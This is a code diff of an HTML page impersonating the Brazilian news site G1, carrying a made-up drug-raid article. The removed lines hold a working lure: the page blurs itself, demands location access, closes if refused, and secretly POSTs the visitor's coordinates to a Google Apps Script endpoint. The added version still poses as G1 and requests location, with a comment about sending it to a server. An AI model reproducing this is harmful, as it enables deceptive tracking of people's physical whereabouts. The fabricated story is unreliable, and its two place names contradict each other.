@@ -1,42 +1,20 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>G1 - Notícias</title>
-
-  <!-- Favicon estilo G1 -->
-  <link rel="icon" href="https://s2.glbimg.com/YAYy5YZABTE9_kDu5CYGskvgq1E=/80x80/top/smart/filters:strip_icc()/s.glbimg.com/jo/g1/f/original/2018/04/23/favicon.ico" type="image/x-icon" />
-
-  <!-- Open Graph -->
-  <meta property="og:title" content="G1.Globo Plantação de maconha e laboratório de drogas são encontrados em casa no Bairro Jardim Cristal" />
-  <meta property="og:description" content="Polícia Militar apreende plantação de maconha e laboratório em São José dos Pinhais, Parana." />
-  <meta property="og:image" content="https://s2.glbimg.com/3QXk3vYoRLkX0I1swmV_FzSxpBY=/640x360/smart/filters:strip_icc()/s.glbimg.com/jo/g1/f/original/2021/06/16/policia-plantacao.jpg" />
-  <meta property="og:url" content="https://seudominio.com/sua-pagina.html" />
-  <meta property="og:type" content="website" />
-
-  <!-- Twitter Card -->
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="G1.Globo Plantação de maconha e laboratório de drogas são encontrados em casa no Bairro Jardim Cristal" />
-  <meta name="twitter:description" content="Polícia Militar apreende plantação de maconha e laboratório em São José dos Pinhais, Parana." />
-  <meta name="twitter:image" content="https://s2.glbimg.com/3QXk3vYoRLkX0I1swmV_FzSxpBY=/640x360/smart/filters:strip_icc()/s.glbimg.com/jo/g1/f/original/2021/06/16/policia-plantacao.jpg" />
-
   <style>
     body {
       font-family: Arial, sans-serif;
       margin: 0;
       background-color: #f5f5f5;
-      color: #222;
-      position: relative;
-      overflow: hidden;
     }
 
     header {
       background-color: #c4170c;
       padding: 10px 20px;
       color: white;
-      position: relative;
-      z-index: 1;
     }
 
     header h1 {
@@ -49,8 +27,6 @@
       color: white;
       padding: 8px 20px;
       font-size: 14px;
-      position: relative;
-      z-index: 1;
     }
 
     .container {
@@ -59,15 +35,12 @@
       background: white;
       padding: 20px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      position: relative;
-      z-index: 1;
     }
 
     .title {
       font-size: 26px;
       color: #c4170c;
       margin-bottom: 10px;
-      font-weight: bold;
     }
 
     .subinfo {
@@ -79,7 +52,6 @@
     .content {
       font-size: 18px;
       line-height: 1.6;
-      color: #333;
     }
 
     footer {
@@ -88,31 +60,6 @@
       text-align: center;
       padding: 10px;
       margin-top: 40px;
-      font-size: 14px;
-      position: relative;
-      z-index: 1;
-    }
-
-    /* Blur e bloqueio inicial */
-    .blurred {
-      filter: blur(8px);
-      pointer-events: none;
-      user-select: none;
-    }
-
-    /* Overlay que escurece e bloqueia */
-    #overlay {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.4);
-      z-index: 10;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      color: white;
-      font-size: 18px;
-      font-family: Arial, sans-serif;
-      user-select: none;
     }
   </style>
 </head>
@@ -129,58 +76,49 @@
   <div class="container">
     <div class="title">Plantação de maconha e laboratório de drogas são encontrados em casa na BR-265</div>
     <div class="subinfo">25/07/2025 15h30 - Atualizado há 2 horas</div>
-
     <div class="content">
       <p>Uma plantação de maconha e um laboratório de drogas foram encontrados pela polícia dentro de uma residência localizada na BR-265, na zona rural de Lavras, em Minas Gerais. A operação foi conduzida pela Polícia Militar após denúncias anônimas.</p>
+
       <p>Segundo as autoridades, no local foram apreendidas diversas mudas de cannabis, equipamentos para cultivo indoor e substâncias químicas usadas na fabricação de entorpecentes.</p>
+
       <p>O responsável pela residência foi preso em flagrante e encaminhado à delegacia da cidade. A Polícia Civil segue investigando o caso para identificar possíveis conexões com o tráfico regional.</p>
-      <p>Investigações continuam para desarticular toda a rede envolvida, visando reduzir o impacto do tráfico na região.</p>
-      <p>O caso também reacende o debate sobre políticas públicas de combate às drogas e a necessidade de ações integradas entre as forças de segurança.</p>
     </div>
   </div>
 
   <footer>
     © 2025 G1 - Todos os direitos reservados
   </footer>
-
-  <div id="overlay">Por favor, permita o acesso à sua localização para continuar navegando</div>
-
+  
+  
   <script>
-    document.body.classList.add('blurred');
+  // Verifica se o navegador suporta a API de Geolocalização
+  if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      function(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        console.log("Localização do usuário:");
+        console.log("Latitude:", latitude);
+        console.log("Longitude:", longitude);
 
-    function liberarConteudo() {
-      document.body.classList.remove('blurred');
-      document.getElementById('overlay').style.display = 'none';
-    }
-
-    window.addEventListener('load', () => {
-      if (!navigator.geolocation) {
-        window.close();
-        return;
+        // Você pode exibir ou enviar esses dados a um servidor:
+        document.body.insertAdjacentHTML('beforeend', 
+          `<div style="padding:20px; background:#eee; margin-top:20px;">
+             <strong>Localização detectada:</strong><br>
+             Latitude: ${latitude}<br>
+             Longitude: ${longitude}
+           </div>`);
+      },
+      function(error) {
+        console.warn("Erro ao obter localização:", error.message);
       }
+    );
+  } else {
+    console.warn("Geolocalização não é suportada pelo navegador.");
+  }
+</script>
 
-      navigator.geolocation.getCurrentPosition(async (pos) => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-
-        const url = "https://script.google.com/macros/s/AKfycbwk5F09_2ajt_z2a054KA369U7s33QNwLiTu1AO06KbvU4mRUgQixX-yICwbMzYLxHF/exec";
-        const payload = { latitude: lat, longitude: lon };
-        try {
-          await fetch(url, {
-            method: "POST",
-            body: JSON.stringify(payload)
-          });
-        } catch (e) {
-          console.warn("Erro ao enviar localização:", e);
-        }
-
-        liberarConteudo();
-
-      }, (error) => {
-        window.close();
-      });
-    });
-  </script>
 
 </body>
 </html>
+
